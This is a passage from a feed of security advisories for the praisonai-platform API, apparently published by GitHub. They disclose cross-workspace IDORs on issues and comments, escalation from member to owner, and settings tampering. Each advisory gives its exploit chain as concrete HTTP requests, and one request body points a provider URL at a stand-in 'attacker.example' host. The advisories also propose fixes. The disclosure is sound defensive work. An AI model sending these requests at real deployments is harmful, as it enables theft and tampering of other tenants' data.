    user: AuthIdentity = Depends(require_workspace_member),
    session: AsyncSession = Depends(get_db),
):
    svc = IssueService(session)
    issue = await svc.update(                                       # &lt;-- writes to any issue in the DB
        issue_id, title=body.title, description=body.description,
        status=body.status, priority=body.priority,
        assignee_type=body.assignee_type, assignee_id=body.assignee_id,
        project_id=body.project_id,
    )
    ...
</code></pre>
<p><code>delete_issue</code> (lines 127-137) repeats the pattern.</p>
<p><strong>Why it's wrong:</strong> <code>workspace_id</code> from the route is used solely as a membership predicate ("are you in some workspace W?"), never as a resource-ownership predicate ("is the issue you are addressing actually inside W?"). The standard FastAPI/SQLAlchemy fix is to make the resource-lookup query include the workspace constraint and treat absence as 404, so a foreign-workspace issue is indistinguishable from a non-existent one. The <code>update_issue</code> handler additionally allows the attacker to overwrite <code>project_id</code>, which can re-assign the foreign issue to an unrelated project the attacker also does not own — escalating the scope of the write primitive.</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Attacker registers a workspace <code>W_attacker</code> (where they are a member) and harvests a target issue UUID <code>I_T</code> from any side channel: the activity feed (<code>activity.py:log</code> records <code>issue_id=...</code>), comment threads, error messages, exported issue dumps, issue mentions in agent prompts, or operator screenshots. Issue IDs are uuid4 strings but they are not secret. State: attacker holds <code>I_T</code>.</li>
<li>Attacker authenticates and POSTs <code>Authorization: Bearer &lt;attacker_jwt&gt;</code> to <code>GET /workspaces/W_attacker/issues/I_T</code>. <code>require_workspace_member(W_attacker, attacker)</code> passes (attacker is a member of <code>W_attacker</code>). State: control flow enters <code>get_issue</code> with <code>workspace_id=W_attacker, issue_id=I_T</code>.</li>
<li><code>IssueService.get(I_T)</code> runs <code>session.get(Issue, "I_T")</code>, which is <code>SELECT * FROM issues WHERE id = 'I_T' LIMIT 1</code> with no <code>workspace_id = 'W_attacker'</code> filter. The row is returned in full — including <code>title</code>, <code>description</code> (often confidential bug-report content, customer PII, embedded credentials, or internal roadmap data), <code>status</code>, <code>priority</code>, <code>assignee_id</code>, <code>created_by</code>, and <code>project_id</code>. State: response body is the JSON-serialised foreign issue.</li>
<li>Attacker repeats with <code>PATCH /workspaces/W_attacker/issues/I_T</code> and a body of <code>{"description": "&lt;reset&gt;", "status": "closed", "project_id": "&lt;arbitrary&gt;"}</code>. <code>update_issue</code> calls <code>svc.update(I_T, ...)</code> which loads the target row and mutates the listed fields. State: the foreign workspace's issue is silently re-described, re-statused, and re-projected.</li>
<li>Attacker calls <code>DELETE /workspaces/W_attacker/issues/I_T</code> to destroy the target issue. <code>IssueService.delete</code> loads the row and calls <code>session.delete()</code>. State: target issue is gone from the foreign workspace.</li>
<li>Final state: any attacker with one workspace-member token can enumerate, exfiltrate, rewrite, and delete every issue in the multi-tenant deployment given the issue UUIDs (which leak through the side channels above). The <code>act_svc.log(workspace_id, "issue.updated", "issue", issue.id, ...)</code> call at line 118 records the event under <code>W_attacker</code> rather than <code>W_target</code>, so the foreign workspace's audit trail does not record the tampering — making detection harder.</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Severity:</strong> sec-high. CVSS 8.1: network attack, low complexity, low privileges (any workspace member), no user interaction, scope unchanged, high confidentiality (full issue body including any embedded secrets), high integrity (arbitrary writes including project re-assignment), low availability (DELETE wipes target issues).
<strong>Attacker capability:</strong> with one workspace-member token plus a harvested issue UUID, an attacker reads the target issue's <code>title</code>, <code>description</code>, <code>status</code>, <code>priority</code>, <code>assignee_id</code>, and <code>project_id</code>; rewrites any of those fields (silent edit, false closure, malicious re-assignment); re-projects the issue to an unrelated project to confuse triagers; or deletes the issue altogether to destroy evidence of customer reports.
<strong>Preconditions:</strong> <code>praisonai-platform</code> is deployed multi-tenant; the attacker has any membership token; the target issue's UUID is known or guessable (UUIDs leak through activity feeds, comment threads, error messages, exported dumps, and operator screenshots).
<strong>Differential:</strong> source-inspection-verified end-to-end. The asymmetry between <code>IssueService.get(issue_id)</code> (no workspace check) and <code>MemberService.get(workspace_id, user_id)</code> (composite key check) in the same codebase confirms the pattern. With the suggested fix below applied, <code>IssueService.get(workspace_id, issue_id)</code> returns <code>None</code> for foreign-workspace issues, the route handler returns 404, and the foreign data is indistinguishable from a missing record.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Make every single-row resource lookup take the workspace predicate; treat foreign-workspace rows as 404.</p>
<pre><code class="language-diff">--- a/src/praisonai-platform/praisonai_platform/services/issue_service.py
+++ b/src/praisonai-platform/praisonai_platform/services/issue_service.py
@@ -69,9 +69,12 @@ class IssueService:
         await self._session.flush()
         return issue

-    async def get(self, issue_id: str) -&gt; Optional[Issue]:
-        """Get issue by ID."""
-        return await self._session.get(Issue, issue_id)
+    async def get(self, workspace_id: str, issue_id: str) -&gt; Optional[Issue]:
+        """Get issue by ID, scoped to a workspace."""
+        stmt = select(Issue).where(
+            Issue.id == issue_id, Issue.workspace_id == workspace_id
+        )
+        return (await self._session.execute(stmt)).scalar_one_or_none()

     async def update(
         self,
+        workspace_id: str,
         issue_id: str,
         ...
     ) -&gt; Optional[Issue]:
-        issue = await self.get(issue_id)
+        issue = await self.get(workspace_id, issue_id)
         ...

-    async def delete(self, issue_id: str) -&gt; bool:
+    async def delete(self, workspace_id: str, issue_id: str) -&gt; bool:
-        issue = await self.get(issue_id)
+        issue = await self.get(workspace_id, issue_id)
</code></pre>
<p>Update the route handlers in <code>routes/issues.py</code> to thread <code>workspace_id</code> through. The same pattern (single-key resource lookup gated only by workspace-member check) exists in <code>AgentService</code>, <code>ProjectService</code>, <code>CommentService</code>, and <code>LabelService</code>; each is a separate exploitable IDOR and should be filed as its own advisory so each gets a CVE.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-xwq8-frcg-77q8">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-xwq8-frcg-77q8</a></li>
<li><a href="https://github.com/advisories/GHSA-xwq8-frcg-77q8">https://github.com/advisories/GHSA-xwq8-frcg-77q8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xwq8-frcg-77q8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-01T14:24:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai-platform] praisonai-platform: Any workspace member can add arbitrary user as owner via POST /workspaces/{id}/members]]></title>
        <id>https://github.com/advisories/GHSA-8g2p-pqm3-fcfh</id>
        <link href="https://github.com/advisories/GHSA-8g2p-pqm3-fcfh"/>
        <updated>2026-06-01T14:23:41.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><strong>Type:</strong> Privilege escalation / cross-tenant member injection. The <code>POST /workspaces/{workspace_id}/members</code> endpoint is gated only by <code>require_workspace_member(workspace_id)</code> (default <code>min_role="member"</code>) and forwards the request body's <code>user_id</code> and <code>role</code> straight into <code>MemberService.add(workspace_id, user_id, role)</code>, which has no caller-permission check. A user with the lowest workspace privilege can add any user (including a new attacker-controlled second account, or an existing account they want to grief) as owner of the workspace.
<strong>File:</strong> <code>src/praisonai-platform/praisonai_platform/api/routes/workspaces.py</code>, lines 92-101; <code>services/member_service.py</code>, lines 26-38.
<strong>Root cause:</strong> <code>MemberService.add</code> validates only that <code>role</code> is in <code>VALID_ROLES = {"owner", "admin", "member"}</code> — the value, not the caller's right to assign it. The route's <code>Depends(require_workspace_member)</code> resolves to the default <code>min_role="member"</code>. So a member-level token plus one POST gives the attacker an alternate identity with owner role inside the same workspace, bypassing every owner-only operation that <em>would</em> otherwise gate them.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File 1:</strong> <code>src/praisonai-platform/praisonai_platform/api/routes/workspaces.py</code>, lines 92-101.</p>
<pre><code class="language-python">@router.post("/{workspace_id}/members", response_model=MemberResponse, status_code=status.HTTP_201_CREATED)
async def add_member(
    workspace_id: str,
    body: MemberAdd,
    user: AuthIdentity = Depends(require_workspace_member),         # &lt;-- BUG: defaults to min_role="member"
    session: AsyncSession = Depends(get_db),
):
    member_svc = MemberService(session)
    member = await member_svc.add(workspace_id, body.user_id, body.role)  # &lt;-- writes any (user, role)
    return MemberResponse.model_validate(member)
</code></pre>
<p><strong>File 2:</strong> <code>src/praisonai-platform/praisonai_platform/services/member_service.py</code>, lines 26-38.</p>
<pre><code class="language-python">async def add(
    self,
    workspace_id: str,
    user_id: str,
    role: str = "member",
) -&gt; Member:
    """Add a user to a workspace."""
    if role not in VALID_ROLES:                                      # only validates the value
        raise ValueError(f"Invalid role: {role}. Must be one of {VALID_ROLES}")
    member = Member(workspace_id=workspace_id, user_id=user_id, role=role)
    self._session.add(member)                                        # &lt;-- BUG: no caller-permission check
    await self._session.flush()
    return member
</code></pre>
<p><strong>Why it's wrong:</strong> workspace member management is the textbook capability that must be gated on owner role. The role hierarchy is implemented (<code>MemberService.has_role</code>, member_service.py:80-96), the dependency-tunable <code>min_role</code> parameter exists (<code>require_workspace_member(min_role)</code>, deps.py:58), but the <code>POST .../members</code> route uses neither. The <code>VALID_ROLES</code> enum check is purely cosmetic — it accepts <code>"owner"</code> from any caller because the route never asked whether the caller has the right to assign that role.</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Attacker registers two accounts (or recruits a member account on the target workspace <code>W</code>). Account A is an existing member of <code>W</code>; Account B is a fresh signup the attacker controls (any account on the platform — <code>auth/register</code> is open by default). State: attacker holds tokens for both A and B.</li>
<li>Attacker authenticates as Account A and POSTs <code>Authorization: Bearer &lt;A_jwt&gt;</code> to <code>POST /workspaces/W/members</code> with body <code>{"user_id": "&lt;B_user_id&gt;", "role": "owner"}</code>. State: control flow enters <code>add_member</code>.</li>
<li><code>require_workspace_member(W, A)</code> passes (A is a member). <code>MemberService.add(W, B, "owner")</code> writes a new row <code>Member(workspace_id=W, user_id=B, role="owner")</code>. State: Account B is now a workspace-W owner.</li>
<li>Attacker switches to Account B and acts as workspace owner — change settings, add/remove members, delete the workspace, or pivot to the companion advisories' primitives. State: attacker holds owner of any workspace they had member access to, via a fresh attacker-controlled identity that the original workspace's audit logs cannot easily attribute to A.</li>
<li>Final state: with one member-level token plus one POST, the attacker plants an owner-role identity on any workspace they can reach. The same primitive lets the attacker invite a competitor or external-vendor account into the workspace as owner, exfiltrating the workspace's content under that competitor's name.</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Severity:</strong> sec-critical. CVSS 9.1: network attack, low complexity, low privileges (member tier), no user interaction, scope changed (the new owner is a different security principal), high confidentiality and integrity, no availability claim.
<strong>Attacker capability:</strong> with one workspace-member token plus one POST request, the attacker grants owner-tier access to any user_id on the platform. From there, full workspace control via the Account B token, plus indirect attribution: the original workspace's audit logs see "user A added user B as owner" but the audit trail cannot tell that B is attacker-controlled.
<strong>Preconditions:</strong> <code>praisonai-platform</code> is deployed multi-tenant; the attacker has any membership token in the target workspace; the attacker can register or knows any other user_id on the platform.
<strong>Differential:</strong> source-inspection-verified. The asymmetry between <code>MemberService.has_role</code> (clearly tiered) and <code>add_member</code>'s default <code>min_role="member"</code> confirms the gap. With the suggested fix below, the gate refuses the member-tier token, the elevated POST returns 403, and the second-identity owner is never created.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<pre><code class="language-diff">--- a/src/praisonai-platform/praisonai_platform/api/routes/workspaces.py
+++ b/src/praisonai-platform/praisonai_platform/api/routes/workspaces.py
@@ -90,11 +90,15 @@
+def _require_workspace_owner(workspace_id: str, user, session):
+    return require_workspace_member(workspace_id, user, session, min_role="owner")
+
 @router.post("/{workspace_id}/members", response_model=MemberResponse, status_code=status.HTTP_201_CREATED)
 async def add_member(
     workspace_id: str,
     body: MemberAdd,
-    user: AuthIdentity = Depends(require_workspace_member),
+    user: AuthIdentity = Depends(_require_workspace_owner),
     session: AsyncSession = Depends(get_db),
 ):
     member_svc = MemberService(session)
+    if body.role == "owner" and not await member_svc.has_role(workspace_id, user.id, "owner"):
+        raise HTTPException(status_code=403, detail="Only owners can add other owners")
     member = await member_svc.add(workspace_id, body.user_id, body.role)
</code></pre>
<p>The four other workspace mutation endpoints (<code>update_workspace</code>, <code>delete_workspace</code>, <code>update_member_role</code>, <code>remove_member</code>) exhibit the same default-min-role gap and are filed as their own advisories.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-8g2p-pqm3-fcfh">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-8g2p-pqm3-fcfh</a></li>
<li><a href="https://github.com/advisories/GHSA-8g2p-pqm3-fcfh">https://github.com/advisories/GHSA-8g2p-pqm3-fcfh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8g2p-pqm3-fcfh</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-01T14:23:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai-platform] praisonai-platform: Any workspace member can rewrite workspace name, description, and settings via PATCH /workspaces/{id}]]></title>
        <id>https://github.com/advisories/GHSA-rcmc-q9rj-4wmq</id>
        <link href="https://github.com/advisories/GHSA-rcmc-q9rj-4wmq"/>
        <updated>2026-06-01T14:23:11.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><strong>Type:</strong> Authorization bypass enabling workspace metadata + settings tampering. The <code>PATCH /workspaces/{workspace_id}</code> endpoint is gated only by <code>require_workspace_member(workspace_id)</code> (default <code>min_role="member"</code>). Any member can rewrite the workspace's <code>name</code>, <code>description</code>, and the <code>settings</code> JSON blob. The settings field is a free-form JSON object — depending on which downstream code reads it, this becomes a configuration-injection primitive for any setting the platform exposes there.
<strong>File:</strong> <code>src/praisonai-platform/praisonai_platform/api/routes/workspaces.py</code>, lines 63-74; <code>services/workspace_service.py</code>'s <code>update()</code> method.
<strong>Root cause:</strong> <code>Depends(require_workspace_member)</code> resolves to default <code>min_role="member"</code>. <code>WorkspaceService.update(workspace_id, name, description, settings)</code> writes the new fields to the workspace row without any caller-permission check. The role hierarchy (<code>MemberService.has_role</code>) is never consulted.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File:</strong> <code>src/praisonai-platform/praisonai_platform/api/routes/workspaces.py</code>, lines 63-74.</p>
<pre><code class="language-python">@router.patch("/{workspace_id}", response_model=WorkspaceResponse)
async def update_workspace(
    workspace_id: str,
    body: WorkspaceUpdate,
    user: AuthIdentity = Depends(require_workspace_member),         # &lt;-- BUG: defaults to min_role="member"
    session: AsyncSession = Depends(get_db),
):
    ws_svc = WorkspaceService(session)
    ws = await ws_svc.update(workspace_id, body.name, body.description, body.settings)  # &lt;-- writes any value
    if ws is None:
        raise HTTPException(status_code=404, detail="Workspace not found")
    return WorkspaceResponse.model_validate(ws)
</code></pre>
<p><strong>Why it's wrong:</strong> workspace name and settings are owner-tier fields. Renaming the workspace to a profanity is a low-impact griefing vector; rewriting the JSON <code>settings</code> blob is potentially a much higher-impact configuration injection (depending on what fields downstream code reads from <code>settings</code>, the attacker may flip feature flags, redirect webhook URLs, change LLM provider keys for shared configs, disable audit logging, etc.). The <code>require_workspace_member(min_role)</code> parameter is implemented and unused. This endpoint should require owner.</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Attacker is a member of workspace <code>W</code> with role "member". State: attacker holds JWT.</li>
<li>Attacker sends <code>PATCH /workspaces/W</code> with <code>Authorization: Bearer &lt;attacker_jwt&gt;</code> and body <code>{"name": "Compromised", "description": "Owned by attacker", "settings": {"allow_public_invite": true, "ai_provider_url": "https://attacker.example/v1"}}</code>. State: control flow enters <code>update_workspace</code>.</li>
<li><code>require_workspace_member(W, attacker)</code> passes. <code>WorkspaceService.update(W, ...)</code> writes the three fields. State: workspace <code>W</code> now has attacker-chosen name, description, and settings.</li>
<li>The settings JSON is read by any downstream code that consults workspace settings (LLM proxying, invite flows, webhook routing). If the deployment uses settings-keyed configuration overrides, those overrides now point at attacker-controlled endpoints.</li>
<li>Final state: with one member-level token plus one PATCH, the attacker rewrites the workspace's metadata and settings, with effects ranging from cosmetic (rename) to substantive (settings-keyed config injection).</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Severity:</strong> sec-moderate. CVSS 6.5: network attack, low complexity, low privileges, no user interaction, scope unchanged, no confidentiality directly (though settings rewrites may enable indirect data exfiltration via attacker-pointed integration URLs), high integrity, no availability claim.
<strong>Attacker capability:</strong> rewrite any workspace's name, description, and settings JSON. The actual blast radius depends on what fields the deployment reads from <code>settings</code> — but that field is documented as a free-form JSON blob, so any future configuration the platform adds there becomes attacker-tunable.
<strong>Preconditions:</strong> <code>praisonai-platform</code> is deployed multi-tenant; attacker has any membership token in the target workspace.
<strong>Differential:</strong> source-inspection-verified. With the suggested fix below, member-tier tokens fail the gate and the metadata rewrite is rejected with 403.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<pre><code class="language-diff">--- a/src/praisonai-platform/praisonai_platform/api/routes/workspaces.py
+++ b/src/praisonai-platform/praisonai_platform/api/routes/workspaces.py
@@ -63,11 +63,11 @@
 @router.patch("/{workspace_id}", response_model=WorkspaceResponse)
 async def update_workspace(
     workspace_id: str,
     body: WorkspaceUpdate,
-    user: AuthIdentity = Depends(require_workspace_member),
+    user: AuthIdentity = Depends(_require_workspace_owner),  # see member-update-role advisory for helper
     session: AsyncSession = Depends(get_db),
 ):
     ws_svc = WorkspaceService(session)
     ws = await ws_svc.update(workspace_id, body.name, body.description, body.settings)
     if ws is None:
         raise HTTPException(status_code=404, detail="Workspace not found")
     return WorkspaceResponse.model_validate(ws)
</code></pre>
<p>Defence-in-depth: validate the keys allowed in <code>body.settings</code> against an allowlist so the field cannot become an arbitrary config-injection primitive even for owners. The four companion workspace-mutation endpoints (<code>add_member</code>, <code>update_member_role</code>, <code>remove_member</code>, <code>delete_workspace</code>) exhibit the same default-min-role gap and are filed as their own advisories.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-rcmc-q9rj-4wmq">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-rcmc-q9rj-4wmq</a></li>
<li><a href="https://github.com/advisories/GHSA-rcmc-q9rj-4wmq">https://github.com/advisories/GHSA-rcmc-q9rj-4wmq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rcmc-q9rj-4wmq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-01T14:23:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai-platform] praisonai-platform: Comment endpoints accept any issue_id without workspace ownership check, cross-workspace comment read and post IDOR]]></title>
        <id>https://github.com/advisories/GHSA-cp4f-5m9r-5jc2</id>
        <link href="https://github.com/advisories/GHSA-cp4f-5m9r-5jc2"/>
        <updated>2026-06-01T14:19:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><strong>Type:</strong> Insecure Direct Object Reference. The comment endpoints (<code>POST /workspaces/{workspace_id}/issues/{issue_id}/comments</code> and <code>GET .../comments</code>) gate access on <code>require_workspace_member(workspace_id)</code> only, then call <code>CommentService.create(issue_id=issue_id, ...)</code> and <code>CommentService.list_for_issue(issue_id)</code> without verifying that <code>issue_id</code> belongs to <code>workspace_id</code>. A user who is a member of any workspace <code>W1</code> can read every comment on, and post new comments to, any issue in any other workspace <code>W2</code>.
<strong>File:</strong> <code>src/praisonai-platform/praisonai_platform/api/routes/issues.py</code>, lines 143-171; <code>src/praisonai-platform/praisonai_platform/services/comment_service.py</code>, lines 19-53.
<strong>Root cause:</strong> the route extracts <code>workspace_id</code> from the URL path and uses it solely for the membership gate, then passes the URL-supplied <code>issue_id</code> straight into <code>CommentService</code> without confirming that this issue exists in <code>workspace_id</code>. <code>CommentService.list_for_issue(issue_id)</code> runs <code>SELECT * FROM comments WHERE issue_id = :issue_id</code> with no workspace join. <code>CommentService.create(issue_id=issue_id, ...)</code> blindly writes a row with that <code>issue_id</code>. Both flows trust the URL-supplied issue ID as authoritative even though the membership check guarantees nothing about it.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File 1:</strong> <code>src/praisonai-platform/praisonai_platform/api/routes/issues.py</code>, lines 143-171.</p>
<pre><code class="language-python">@router.post("/{issue_id}/comments", response_model=CommentResponse, status_code=status.HTTP_201_CREATED)
async def add_comment(
    workspace_id: str,
    issue_id: str,
    body: CommentCreate,
    user: AuthIdentity = Depends(require_workspace_member),         # only checks attacker is in workspace_id
    session: AsyncSession = Depends(get_db),
):
    svc = CommentService(session)
    comment = await svc.create(
        issue_id=issue_id,                                          # &lt;-- BUG: no validation that issue_id is in workspace_id
        author_id=user.id,
        content=body.content,
        author_type="member" if user.is_user else "agent",
        parent_id=body.parent_id,
    )
    return CommentResponse.model_validate(comment)


@router.get("/{issue_id}/comments", response_model=List[CommentResponse])
async def list_comments(
    workspace_id: str,
    issue_id: str,
    user: AuthIdentity = Depends(require_workspace_member),
    session: AsyncSession = Depends(get_db),
):
    svc = CommentService(session)
    comments = await svc.list_for_issue(issue_id)                   # &lt;-- BUG: returns comments on any issue
    return [CommentResponse.model_validate(c) for c in comments]
</code></pre>
<p><strong>File 2:</strong> <code>src/praisonai-platform/praisonai_platform/services/comment_service.py</code>, lines 19-53.</p>
<pre><code class="language-python">class CommentService:
    ...

    async def create(
        self,
        issue_id: str,
        author_id: str,
        content: str,
        author_type: str = "member",
        comment_type: str = "comment",
        parent_id: Optional[str] = None,
    ) -&gt; Comment:
        comment = Comment(
            issue_id=issue_id,                                      # &lt;-- accepts any issue_id; no workspace verify
            author_type=author_type,
            author_id=author_id,
            ...
        )
        self._session.add(comment)
        await self._session.flush()
        return comment

    async def list_for_issue(self, issue_id: str) -&gt; list[Comment]:
        stmt = (
            select(Comment)
            .where(Comment.issue_id == issue_id)                    # &lt;-- no JOIN against issues for workspace constraint
            .order_by(Comment.created_at)
        )
        result = await self._session.execute(stmt)
        return list(result.scalars().all())
</code></pre>
<p><strong>Why it's wrong:</strong> the service trusts the caller-supplied <code>issue_id</code> as authoritative, but the route layer never verified that this issue belongs to the workspace the membership check covers. The standard FastAPI/SQLAlchemy fix is to first resolve the issue scoped to <code>workspace_id</code> (<code>Issue.id = :issue_id AND Issue.workspace_id = :workspace_id</code>) and only then proceed to comment operations. The <code>MemberService.get(workspace_id, user_id)</code> and <code>LabelService.list_for_workspace(workspace_id)</code> calls in the same codebase show the safe predicate; the comment service forgot to apply it.</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Attacker registers a workspace <code>W_attacker</code> (member) and harvests a target issue UUID <code>I_T</code> from any side channel: agent prompts that mention issues, the activity feed (<code>act_svc.log</code> records <code>issue_id</code>), webhook payloads, exported issue dumps, or simply by being a low-privilege observer of the attacker's own workspace whose internals reference foreign issue IDs (cross-workspace links, search across activity events). State: attacker holds <code>I_T</code>.</li>
<li>Attacker authenticates and sends <code>GET /workspaces/W_attacker/issues/I_T/comments</code>. <code>require_workspace_member(W_attacker, attacker)</code> passes (attacker is a member of <code>W_attacker</code>). State: control flow enters <code>list_comments</code> with <code>workspace_id=W_attacker, issue_id=I_T</code>.</li>
<li><code>CommentService.list_for_issue(I_T)</code> runs <code>SELECT * FROM comments WHERE issue_id = 'I_T'</code> with no workspace constraint. Every comment on the foreign issue is returned: <code>content</code> (often the most sensitive part of an issue tracker — bug-report repro steps with secrets, customer PII, internal triage notes), <code>author_id</code>, <code>author_type</code>, <code>parent_id</code>, <code>created_at</code>. State: response body is the full comment thread of the foreign issue.</li>
<li>Attacker repeats with <code>POST /workspaces/W_attacker/issues/I_T/comments</code> and a body of <code>{"content": "&lt;malicious&gt;"}</code>. <code>CommentService.create(issue_id=I_T, author_id=attacker, ...)</code> writes a row with the foreign issue's id and the attacker's <code>author_id</code>. State: a new comment authored by the attacker appears in the foreign workspace's issue thread, indistinguishable to the foreign workspace's UI from a legitimate cross-workspace mention. Used at scale this becomes a comment-spam / phishing primitive (links in the comment body) targeting another tenant's users.</li>
<li>Final state: any attacker with one workspace-member token can exfiltrate every comment in the multi-tenant deployment given the issue UUIDs, and inject arbitrary comments under their own author identity into any foreign issue. The cross-workspace attribution gap is the worst part: the comment is recorded with the attacker's <code>author_id</code>, but the foreign workspace has no member with that id and the foreign workspace's audit logs show no event (the <code>act_svc.log</code> call in <code>add_comment</code> is omitted).</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Severity:</strong> sec-high. CVSS 7.6: network attack, low complexity, low privileges, no user interaction, scope unchanged, high confidentiality (full comment threads), high integrity (cross-workspace comment injection under attacker's own id), no availability claim.
<strong>Attacker capability:</strong> read every comment on every issue in the multi-tenant deployment given the issue UUIDs; post arbitrary comments under the attacker's identity into any foreign issue, allowing comment-spam, phishing-link injection into another tenant's UI, or social-engineering attribution attacks (the foreign workspace's UI renders a comment whose author belongs to no member of that workspace).
<strong>Preconditions:</strong> <code>praisonai-platform</code> is deployed multi-tenant; the attacker has any membership token; the target issue's UUID is known or guessable.
<strong>Differential:</strong> source-inspection-verified end-to-end. The asymmetry between <code>CommentService.list_for_issue(issue_id)</code> (no workspace predicate) and <code>LabelService.list_for_workspace(workspace_id)</code> (correctly workspace-scoped) confirms the gap. With the suggested fix below, every comment route first resolves the issue scoped to <code>workspace_id</code>, returns 404 if the issue is foreign, and only then proceeds.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Resolve the issue scoped to <code>workspace_id</code> at the route layer before dispatching to <code>CommentService</code>. This both fixes the read and the write paths and avoids changing the <code>CommentService</code> signature.</p>
<pre><code class="language-diff">--- a/src/praisonai-platform/praisonai_platform/api/routes/issues.py
+++ b/src/praisonai-platform/praisonai_platform/api/routes/issues.py
@@ -141,6 +141,11 @@ async def delete_issue(...):
 # ── Comments ─────────────────────────────────────────────────────────────────


+async def _require_issue_in_workspace(session, workspace_id: str, issue_id: str):
+    issue = await IssueService(session).get(workspace_id, issue_id)  # workspace-scoped get (see companion advisory)
+    if issue is None:
+        raise HTTPException(status_code=404, detail="Issue not found")
+
 @router.post("/{issue_id}/comments", response_model=CommentResponse, status_code=status.HTTP_201_CREATED)
 async def add_comment(
     workspace_id: str,
@@ -149,6 +154,7 @@ async def add_comment(
     user: AuthIdentity = Depends(require_workspace_member),
     session: AsyncSession = Depends(get_db),
 ):
+    await _require_issue_in_workspace(session, workspace_id, issue_id)
     svc = CommentService(session)
     comment = await svc.create(
         issue_id=issue_id,
@@ -167,5 +173,6 @@ async def list_comments(
     user: AuthIdentity = Depends(require_workspace_member),
     session: AsyncSession = Depends(get_db),
 ):
+    await _require_issue_in_workspace(session, workspace_id, issue_id)
     svc = CommentService(session)
     comments = await svc.list_for_issue(issue_id)
</code></pre>
<p>Companion advisories file the same workspace-scoping gap for <code>AgentService</code>, <code>IssueService</code>, <code>ProjectService</code>, and <code>LabelService</code>. Each is a separate exploitable IDOR.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-cp4f-5m9r-5jc2">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-cp4f-5m9r-5jc2</a></li>
<li><a href="https://github.com/advisories/GHSA-cp4f-5m9r-5jc2">https://github.com/advisories/GHSA-cp4f-5m9r-5jc2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cp4f-5m9r-5jc2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-01T14:19:33.000Z</published>
    </entry>
</feed>